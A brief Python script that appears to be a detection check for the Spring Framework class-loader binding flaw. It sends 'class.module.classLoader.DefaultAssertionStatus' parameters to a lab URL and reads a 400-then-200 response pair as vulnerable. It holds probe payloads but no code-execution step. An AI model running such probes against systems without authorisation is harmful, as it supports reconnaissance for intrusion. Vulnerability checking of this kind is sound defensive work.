from re import U
import requests

def check(url):
    if url[-1:] != '/':
        url=url+"/"

    headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    }

    poc1="class.module.classLoader.DefaultAssertionStatus=ttt"
    poc2="class.module.classLoader.DefaultAssertionStatus=true"
    try:
        r=requests.get(url+"?"+poc1)
        if r.status_code==400:
            r=requests.get(url+"?"+poc2)
            if r.status_code==200:
                return True    

        r=requests.post(url,data=poc1,headers=headers)
        if r.status_code==400:
            r=requests.post(url,data=poc2,headers=headers)
            if r.status_code==200:
                return True   
    except Exception as e:
        return False

    return False

if '__main__'==__name__:
    url="http://192.168.181.1:9090/springrce_war_exploded/test"
    if check(url):
        print("[%s] 存在漏洞"%url)
    else:
        print("[%s] 不存在漏洞"%url)

    
